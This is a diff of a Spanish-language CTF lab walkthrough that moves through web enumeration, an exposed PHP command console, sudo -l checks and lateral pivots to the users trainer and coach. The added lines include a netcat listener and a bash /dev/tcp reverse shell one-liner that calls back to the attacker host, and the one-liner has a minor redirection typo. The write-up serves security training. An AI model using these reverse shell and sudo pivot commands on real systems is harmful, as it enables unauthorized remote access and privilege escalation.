@@ -65,32 +65,40 @@ gobuster dir -u http://172.17.0.2/ \
 <br><br>
 Cuando finaliza, vemos que encontró cuatro rutas, la más interesante es /backend, entramos para mirar que contiene y vemos que hay un archivo php llamado gym_console.php
 Este archivo se ejecuta en la página web y es una consola que ejecuta los comandos que le pasemos, como el usuario www-data.
+
 <br><br>
 <img width="1155" height="945" alt="7consolacatetc" src="https://github.com/user-attachments/assets/5154a1d4-8ea9-4e1f-bf48-d93b981609ba" />
 <br><br>
-En el archivo passwd solo vemos usuarios pero ninguna clave, así que miramos con sudo -l qué comandos podemos ejecutar con privilegios de sudo y determinar si tenemos permisos que puedan ser relevantes para la escalada de privilegios. 
+Vemos que hay bastantes usuarios como trainer, coach, www-data y root entre otros.
+Como en el archivo /etc/passwd solo vemos usuarios pero ninguna clave, procedemos a mirar con sudo -l qué comandos podemos ejecutar con privilegios de sudo y determinar si tenemos permisos que puedan ser relevantes para la escalada de privilegios.
 Y vemos que podemos ejecutar como el usuario trainer, mediante sudo y sin contraseña /bin/bash.
+
 <br><br>
 <img width="956" height="798" alt="8jugoso" src="https://github.com/user-attachments/assets/99e31569-d4a6-4f0e-914d-7e82b30f341a" />
 
-Así que vamos a lanzar una revel shell, nos ponemos a la escucha en el puerto 442 con el siguiente comando:
-
+Así que vamos a lanzar una reverse shell, primero nos ponemos a la escucha en el puerto 442 con el siguiente comando:
 
 ```bash
 sudo nc -lvnp 442
 ```
-Desde la consola de la página web lanzamos la revel shell como el usuario trainer.
+
+Desde la consola de la página web lanzamos la reverse shell como el usuario trainer.
+```bash
+sudo -u trainer /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/442 0>1'
+```
+
 <img width="927" height="330" alt="10lanzamosRevel" src="https://github.com/user-attachments/assets/9c35bc7e-dd13-44bc-9e36-8d739fc4bab6" />
 
-Miramos en nuestra terminal si nos ha llegado y ha funcionado perfectamente.
+Miramos en nuestra terminal si nos ha llegado y ha funcionado perfectamente. Ahora somos el usuario trainer pero debemos continuar buscando la forma de llegar a ser root.
 
 <img width="996" height="293" alt="10esperarRevel" src="https://github.com/user-attachments/assets/f2c31646-9116-428b-920b-87e72dc132db" />
 
 
-Ahora tenemos que seguir buscando como escalar privilegios, comenzamos probando de nuevo sudo -l y vemos que también podemos...
+Ahora tenemos que seguir buscando como escalar privilegios, comenzamos probando de nuevo sudo -l y vemos que también podemos ejecutar como el usuario coach sin usar contraseña /bin/bash.
 
 <img width="998" height="313" alt="11coachahora" src="https://github.com/user-attachments/assets/f4236703-7eea-46b8-9fc8-03bb04a36b2f" />
 
+Ahora nos ponemos a la escucha por el puerto 443 y volvemos a lanzar la reverse shell pero esta vez como el usuario coach.
 
 <img width="1244" height="464" alt="12nosfuimos" src="https://github.com/user-attachments/assets/2baad9fd-b0f9-4464-823d-c64326984a51" />
 
